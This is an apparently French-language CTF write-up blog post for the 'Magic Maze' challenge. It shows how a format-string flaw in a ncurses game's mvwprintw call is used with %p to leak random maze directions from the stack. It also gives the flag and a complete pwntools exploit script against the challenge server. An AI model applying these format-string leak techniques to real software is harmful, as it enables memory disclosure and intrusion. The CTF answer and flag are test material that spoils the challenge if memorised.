---
layout: post  
title: "Challenge Magic Maze, jeanne d'hack ctf 2026"
date: 2026-01-31 23:41:40 +0100
categories: CTF
---

Petit jeu en ncurses où l'on doit trouver la sortie d'un labyrinthe en 5 mouvements.
Si on échoue on a droit à une seconde chance.

Quand on tape autre chose que le keypad (touches de direction), le programme copie et affiche le contenu via mvwprintw :
Dans handle_direction() :
>    +0x386            gameover:
>    +0x386                var_555 = 0
>    +0x395                ungetch(zx.q(userInput))
>    +0x3b3                char var_528[0x100]
>    +0x3b3                wgetnstr(stdscr, &var_528, 0xff, &var_528)            <- copie de l'input
>    +0x3df                int32_t rax_58 = ((arg2 + (arg2 u>> 0x1f)) s>> 1) - (strlen(&var_528) u>> 1).d
>    +0x407                mvwprintw(win, zx.q(*arg1), zx.q(rax_58), &var_528)   <- formattage pour la sortie

Mais on passe directement le buffer à la fonction, les format specifiers sont donc interprétés.
Ca permet de leaker des valeurs sur la pile (%p etc).
Mais impossible d'écrire avec %n à cause des protections libc 2.34+ (minimum requis par le bin)

L'action se passe dans la fonction handle_direction. Elle est appelée 2 fois:
>    +0x2be3        rax_121.b = handle_direction(&var_474, var_46c, mazeinitialized: 0) != 0
>    +0x2f5a        rax_191.b = handle_direction(&var_474, var_46c, mazeinitialized: 1) != 0

Le troisième argument, que j'ai appelé mazeinitialized, sert au début de handle_direction:
>    +0x37de            if (mazeinitialized == 1)
>    +0x380f                directionToGo = *((sx.q(iteration) << 2) + &maze)
>    +0x37de            else
>    +0x37ed                directionToGo = random_choice(iteration)

La fonction random_choice appelle rand() et stocke la valeur dans une structure &maze.
La deuxième fois, la direction à prendre est reprise de la &maze

Avec le leak ca devient évident, le premier tour de jeu sert à récupérer les 5 directions,
le deuxième tour sert à les utiliser.
EDIT: la solution attendue ("intended") était cryptographique, la routine de génération de nombre pseudo aléatoires était faible..

En tracant avec gdb/gef on voit que la valeur directionToGo est stockée dans la pile :
>    0x62337e7947ed <handle_direction+00b1> mov    DWORD PTR [rbp-0x548], eax

Au moment du leak avec mvwprintw, la valeur est l'octet de poids faible de la 4eme entrée sur la pile.

Il faut donc leaker l'index 6 de la fonction (r8, r9, et les 4 premières entrées de la pile).
Hélàs les protections actuelles interdisent d'utiliser la forme %6$p (positional arguments).
Pas très grave, va pour des %p à la suite.
La lib ncurses écrase une partie de la sortie pour reformatter, mais il reste l'essentiel ; la direction.
0 pour haut, 1 pour bas, 2 pour gauche, 3 pour droite

On récupère les 5 directions, et on les soumet.

Et paf;
Gan d\'Alf: Congratulations, I knew you were clever enough to escape this labyrinth!
    JDHACK{y0u_sh41L_p45S5sss}

Usage : ./exploit.py REMOTE



```python
#!/usr/bin/env python3

from pwn import *
import re
import sys
sys.tracebacklimit = 0  # yeah I know it crashed

context.arch = 'amd64'

if args.DBG:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

elf = ELF('./magic_maze', checksec=False)

if args.REMOTE:
    p = remote('pwn.jeanne-hack-ctf.org', 9003)
else:
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p, gdbscript='''
            # break *(main+0x673)
            # readmaze                                  break *(handle_direction+0xa2)
            # get flag stillok offset            break *(handle_direction+0x6c)
            # follow strdirection            break *(handle_direction+0x0f6)
            # insecure mvwprintw                       break *(handle_direction+0x407)
            # keypad
            pie break 0x37be
            continue
        ''')

def leak():
    payload=b'\x1b[6~'
    payload+=f'%1x%1x%1x%1x%1x.%p.'.encode()
    p.sendline(payload)
    raw=p.recvuntil(b'so be it')
    # print(raw)
    # print(hexdump(raw))
    #leaks = re.findall(r"0x[0-9a-fA-F]+", raw.decode())
    leaks = re.findall(r"0x1520....(\d)", raw.decode())
    if not leaks:
        return '0'
    else:
        return leaks[0]

# forward, backward, left, right
strdirs=[b'\x1bOA',b'\x1bOB',b'\x1bOD',b'\x1bOC']

# start
p.recvuntil(b'press Enter')
p.sendline(b'')

# 1er tour, leaks
directions=[]
for i in range(5):
    directions.append(leak())

# submit
p.sendline(b'')

p.recvuntil(b'second chance')

log.success(f'directions: {directions}')

for i in range(5):
    p.send(strdirs[int(directions[i])]+b'')
    p.recvuntil(b'Direction')

p.sendline(b'')

print(p.clean())
p.sendline(b'')
```
